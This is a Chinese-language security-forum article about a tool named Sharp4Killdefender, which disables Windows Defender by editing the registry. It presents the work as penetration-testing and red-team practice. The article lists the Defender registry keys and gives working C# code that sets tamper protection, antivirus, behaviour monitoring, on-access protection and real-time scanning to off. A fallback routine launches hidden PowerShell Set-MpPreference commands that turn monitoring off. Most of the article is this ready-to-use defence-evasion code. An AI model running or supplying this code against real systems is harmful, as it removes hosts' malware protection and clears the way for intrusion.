# Sharp4Killdefender：通过修改注册表关闭Windows Defender-先知社区

> **来源**: https://xz.aliyun.com/news/16011  
> **文章ID**: 16011

---

在渗透测试、红队演习或某些特殊的网络安全操作中，禁用或绕过 Windows Defender 等安全软件可能是攻击者常见的目标之一。Windows Defender 是 Windows 操作系统自带的防病毒软件，它能够提供实时保护，防止恶意软件和其他安全威胁的侵害。虽然 Windows Defender 设计上是为了保护用户的系统免受攻击，但在某些情况下，特别是进行渗透测试时可能需要临时禁用它，以避免 Defender 阻止攻击的执行。

本文将介绍一种思路，利用 PowerShell 和注册表编辑技术，通过修改系统设置关闭 Windows Defender 的多个安全功能，尤其是实时监控和行为监控等关键防护。

### 0x01 Windows Defender注册表项

大致的思路是通过修改注册表，全面关闭 Windows Defender 的主要功能，包括防病毒、防篡改、实时保护等功能，下面我们进一步展开说明。

#### 1.1 篡改保护

篡改保护是 Windows Defender 的一项重要功能，用于防止恶意程序或用户未经授权修改安全设置。但需要关闭时，可以通过注册表修改 Windows Defender 的各种安全设置，注册表路径如下所示。

```
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features

```

此路径下 TamperProtection 键值，如果是1表示启用，用户可通过Windows安全中心图形界面或命令行启用或禁用该功能，执行regedit.exe命令启动注册表编辑器，如下图所示。

![](images/20241206120723-98e4b640-b387-1.png)

这里的键值是0，表示功能被禁用，篡改保护关闭。

#### 1.2 防病毒功能

DisableAntiSpyware 是 Windows 注册表中的一个设置项，用于控制是否启用 Windows Defender 防病毒 功能。主要作用是关闭或启用 Windows 自带的防病毒软件，这样便于用户或企业可以使用第三方防病毒解决方案。可以通过注册表修改 Windows Defender 防病毒功能的各种安全设置，注册表路径如下所示。

```
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender

```

可以通过PowerShell 进行注册表查询读取，具体PS代码如下所示。

```
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware"
```

![](images/20241206120852-cdb82fdc-b387-1.png)

如图上所述，当设置为 1 时，Windows Defender Antivirus 的核心服务将被停止，相关的实时保护、病毒扫描、定期保护功能也会被禁用。

#### 1.3 行为监控

行为监控 又称为 Behavior Monitoring，它是 Windows Defender 的一项实时保护功能，用于分析应用程序和进程的行为，检测潜在威胁，也可以通过注册表修改 Windows Defender 行为监控功能的各种安全设置，注册表路径如下所示。

```
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection
```

DisableBehaviorMonitoring 键值 为1，表示行为监控功能关闭，不再分析和检测恶意行为，如下图所示。

![](images/20241206124810-4ae715ea-b38d-1.png)

#### 1.4 访问保护

访问保护 又称为 On-Access Protection，是 Windows Defender 的一项核心实时保护功能，在文件被访问或修改时扫描文件以检测威胁，所在的注册表键值路径如下所示。

```
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection
```

![](images/20241206124857-67441030-b38d-1.png)

键值为1时，表示禁用该功能，文件访问保护功能被关闭，文件在访问时不会进行实时扫描。

#### 1.5 实时扫描

实时扫描（Realtime Scanning）是 Windows Defender 实时保护的重要部分，用于监控系统活动并立即扫描潜在威胁，键名所处于注册表路径如下所示。

```
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable
```

当键值为1时，关闭实时扫描功能，文件或进程的威胁检测会受到限制。

### 0x02 修改Windows Defender 注册表键值对

我们定义了一个 RegistryEdit 方法，用于修改 Windows 注册表中的指定键值对。如果指定的注册表键不存在，它将创建该键并设置值。如果键已经存在并且值不同，则更新值，具体代码如下所示。

```
private static void RegistryEdit(string regPath, string name, string value)
{
            try
            {
                using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (registryKey == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                    }
                    else if (registryKey.GetValue(name) != value)
                    {
                        registryKey.SetValue(name, value, RegistryValueKind.DWord);
                    }
                }
            }
            catch
            {
            }
}

```

上述代码中，通过 Registry.LocalMachine.OpenSubKey 打开指定路径下的注册表项。ReadWriteSubTree 权限表示，可以读写该注册表路径的所有子项。随后，如果指定的注册表项不存在时，使用 Registry.LocalMachine.CreateSubKey(regPath) 创建该路径的注册表项，并使用 SetValue 设置键值对。最后，通过调用 Program.RegistryEdit 方法编辑多个注册表项，包括篡改防护、防病毒功能、行为监控、访问保护和实时扫描，具体代码如下所示。

```
Program.RegistryEdit("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
Program.RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
Program.RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
Program.RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
Program.RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");

```

这段代码通过调用 RegistryEdit 方法，目的是关闭或禁用 Windows Defender 的一些功能。

### 0x03 检查确认 Windows Defender 配置

#### 3.1 获取 Defender 详细数据

Get-MpPreference -verbose 是一个 PowerShell 命令，主要用于获取 Windows Defender 防病毒设置的详细信息。Get-MpPreference 是 PowerShell 中的一部分，用于查询 Windows Defender 的首选项配置，具体代码如下所示。

```
Get-MpPreference -verbose

```

而 -verbose 参数则会输出详细信息，便于管理员查看 Defender 的配置信息，包括实时保护、隔离设置、文件扫描等，如下图所示。

![](images/20241206125721-93b8e716-b38e-1.png)

看到这个输出表明，Windows Defender 的实时监控、行为监控、访问保护等功能都已启用。

#### 3.2 再次对 Defender 关键项做设置

如果发现某些配置项为 false 时，则调用PowerShell命令行再次对该项赋值，这是一条兜底的策略，具体如下所示。

```
while (!process.StandardOutput.EndOfStream)
{
                string text = process.StandardOutput.ReadLine();
                if (text.StartsWith("DisableRealtimeMonitoring") && text.EndsWith("False"))
                {
                    Program.RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");
                }
                else if (text.StartsWith("DisableBehaviorMonitoring") && text.EndsWith("False"))
                {
                    Program.RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
                }
}
private static void RunPS(string args)
{
            new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            }.Start();
}

```

上述代码的作用是通过 PowerShell 命令来检查并修改 Windows Defender 的配置，然后逐行分析输出，检查是否启用了某些特定的安全功能。比如，是否包含 "DisableRealtimeMonitoring"，如果发现为 false 状态，那么会通过调用 RunPS 方法启动一个新的 PowerShell 进程，并运行 Set-MpPreference -DisableRealtimeMonitoring $true 命令来禁用实时监控。运行后， Windows Defender 自动关闭，如下图所示。

![](images/20241206125817-b4e75166-b38e-1.png)

### 0x04 小结

综上，以管理员权限运行Sharp4Killdefender，这样对系统的关键注册表进行修改，修改注册表后，Windows Defender 的核心服务和功能即刻停用，无需重启或手动干预。
